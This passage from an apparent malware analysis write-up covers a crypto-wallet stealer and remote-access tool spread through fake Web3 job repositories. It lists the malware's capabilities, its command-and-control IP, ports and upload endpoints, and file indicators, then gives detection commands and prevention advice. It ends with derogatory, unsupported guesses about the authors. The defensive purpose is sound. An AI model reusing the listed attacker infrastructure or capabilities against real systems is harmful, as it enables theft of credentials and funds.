  "*.json",
  "*.txt",
  "*.pdf",
  "*.doc",
  "*.csv",
];
```

#### 🎯 Multidimensional Profiling:

The malware creates a multidimensional profile that includes:

- Financial value (wallets, documents)
- Technical level (developer vs casual user)
- Security profile (VM usage, preventive measures)
- Monetization potential (crypto assets, documents)
- Behavioral patterns (activity, hours)

This information is of extremely high value because the attacker can prioritize and customize attacks on those candidates who represent a good combination of these aspects.

What the attacker can do:

- 👊 Execute any command as if they were sitting in front of your PC
- 👊 See everything you copy (crypto addresses, passwords, etc.)
- 👊 Download files from your system
- 👊 Install more malware
- 👊 Use your PC as a proxy/botnet
- 👊 Spy on your real-time activity
- 👊 Format your hard drive if they want to
- 👊 Steal credentials from any application
- 👊 Access cameras/microphones with commands

---

### But who is this bastard?

#### 🌐 Identified Servers:

- Main C&C: `144.172.105.189:4661`
- Upload Server: `144.172.105.189:4666`
- File Server: `144.172.105.189:1224`
- Obfuscated URL: `https://bs-production.up.railway.app/on`

#### 🔗 Malicious Endpoints:

```http
POST http://144.172.105.189:1224/uploads
POST http://144.172.105.189/api/service/makelog
POST http://144.172.105.189/api/service/process/
GET  http://144.172.105.189:1224/client/106/212
GET  http://144.172.105.189:1224/pdown
```

A quick `whois` indicates the following:

```text
IP address     144.172.105.189
ISP	           FranTech Solutions
Usage Type     Data Center/Web Hosting/Transit
ASN	           Unknown
Domain Name	   frantech.ca
Country        🇺🇸 United States of America
Cit            Ogden, Utah
```

A virustotal.com analysis reveals:

![Image](https://gist.github.com/raiseerco/37f8abf7feb71663c95390d36c2e5513/raw/7163dba2da784c109ac305b8616f6a4177633e05/6.png)

An analysis via Shodan.io gives an idea of the open ports (can vary by time of day):

https://www.shodan.io/host/144.172.105.189

### Indicators of Compromise (IOCs)

#### 🌐 IP Addresses:

```
144.172.105.189 (C&C Server)
```

#### 📁 Files and Paths:

```
~/.n3/          (Temporary directory)
~/.npl          (Python payload)
~/AppData/Roaming/Exodus/exodus.wallet
~/.config/solana/id.json
```

#### 🔍 Behavior Patterns:

- Silent installation of `socket.io-client`
- Creation of `~/.n3` directory
- Connections to port 4661
- Execution of commands with `windowsHide: true`

Now that we have a detailed understanding of the malware's capabilities and infrastructure, it's time to analyze how to effectively defend against this threat.

<br/>

---

## 🛡️ DETECTION AND COUNTERMEASURES

<br/>

> ### 🔍 _"Do not trust, verify!"_

<br/>

### For Developers

| Measure                | Description                                           | Effectiveness |
| ---------------------- | ----------------------------------------------------- | ------------- |
| Source Verification    | Only download from official/trusted repositories      | 🟢 **High**   |
| Sandboxing             | Execute unknown code in isolated environments         | 🟢 **High**   |
| Red Network Monitoring | Block connections to suspicious IPs                   | 🟡 **Medium** |
| Code Auditing          | Review everything before execution (and use AI tools) | 🟢 **High**   |

<br/>

### For Crypto Users

| Measure          | Description                              | Effectiveness   |
| ---------------- | ---------------------------------------- | --------------- |
| Hardware Wallets | Use physical devices for important funds | 🟢 **Critical** |
| Segregation      | Separate wallets for trading and holding | 🟢 **High**     |
| Verification     | Confirm official URLs and extensions     | 🟡 **Medium**   |
| Updates          | Keep browsers and extensions updated     | 🟡 **Medium**   |

<br/>

### Detection

Although there are many other advanced 3rd-party developer tools, I will show some basic detection methods, using standard shell commands.

```bash
# Monitoring suspicious connections
netstat -an | grep 144.172.105.189

# Verifying suspicious Node.js processes
ps aux | grep node | grep socket.io

# Searching for malicious temporary files
find ~ -name ".n3" -type d
find ~ -name ".npl" -type f

# Checking specific malware ports
ss -tuln | grep -E ':(4661|4666|1224)'
```

### Attack Vectors

#### 🎭 Social Engineering:

1. Fake job offers in Web3/Blockchain
2. "Demo projects" for technical interviews
3. Fake repositories with seemingly legitimate code
4. "Code review" requests
5. Sending false software updates (e.g., patches for Zoom)

#### 🥷 Evasion Techniques:

1. Extreme code obfuscation
2. Background execution (`windowsHide: true`)
3. Silent dependency installation
4. Multiple abstraction layers
5. Integrated anti-debugging

<br/>

> 🚨 **If you suspect you have been a victim of this attack, every second counts. Follow these recommendations immediately.**

<br/>

---

## ⚡ URGENT RECOMMENDATIONS

### If you have already been a victim:

#### Immediate Action:

1. Disconnect internet immediately
2. Transfer funds to new wallets from another device
3. Change all passwords from a clean device
4. Completely format the system
5. Report the incident to authorities

#### Investigation:

```bash
# Check active connections
netstat -an | grep 144.172.105.189

# Search for malicious processes
ps aux | grep -E "(socket.io|\.npl)"

# Verify compromised files
find ~ -name "*.n3" -o -name ".npl"
```

### Future Prevention:

#### Security Checklist:

- [ ] Hardware wallet for main funds
- [ ] Dedicated browser only for crypto
- [ ] 2FA enabled on all accounts
- [ ] Updated antivirus with real-time protection
- [ ] Firewall configured to block suspicious IPs
- [ ] Physical backup of seeds in a secure location

<br/>

🏁
We have reached the end of the investigation. It's time to reflect on the implications of this threat and future trends in cybersecurity.

<br/>

---

## 📝 CONCLUSIONS

### Sophistication of the Attack

This malware represents an **extremely sophisticated and integral stealer**, combining multiple advanced capabilities:

| Capability       | Level                |                                     |
| ---------------- | -------------------- | ----------------------------------- |
| Attack Vectors   | 🔴 **Multiple**      | Social engineering + malicious code |
| RAT Capabilities | 💀 **Complete**      | Total system remote control         |
| Evasion          | 🟡 **Advanced**      | Anti-analysis + VM detection        |
| Persistence      | 🔴 **Multiplatform** | Windows, macOS, Linux               |
| Exfiltration     | 💀 **Massive**       | 22+ wallets + complete credentials  |
| Profiling        | 🟡 **Integral**      | Complete victim analysis            |

### Future Projections

I think we will see more variants of this type of malware specifically targeting blockchain ecosystem professionals, using increasingly sophisticated social engineering vectors combined with AI tools that will make many users and platforms vulnerable.

### Professionals at Risk

| Profile               | Risk            | Potential Impact               |
| --------------------- | --------------- | ------------------------------ |
| Web3 Users            | 💀 **CRITICAL** | Total loss of funds            |
| Blockchain Developers | 🔴 **HIGH**     | Access to repositories + funds |
| Traders/Investors     | 💀 **CRITICAL** | Massive portfolio loss         |
| Crypto Employees      | 🔴 **HIGH**     | Corporate access + personal    |

### About the Perpetrators

It seems unlikely that this was the work of a fat guy in a basement, or a teenager trying to impress their friends.
It could be a fat NK teenager or a similar country. It is evident that they invested long hours of development and testing to carry out crimes of no small magnitude.

---

# Keep your data safe,<br/> no one will do it for you.

<br/>

```
⚖️ Legal Disclaimer

This analysis is provided for educational and prevention purposes only.

❌ DO NOT execute the malicious code analyzed
❌ DO NOT distribute any component of the malware
✅ YES share this analysis to prevent potential victims

**The author is not responsible for the misuse of this information.**

```

---

<br/>
Stay safuuuuu 👋
<br/>
<br/>
<br/>
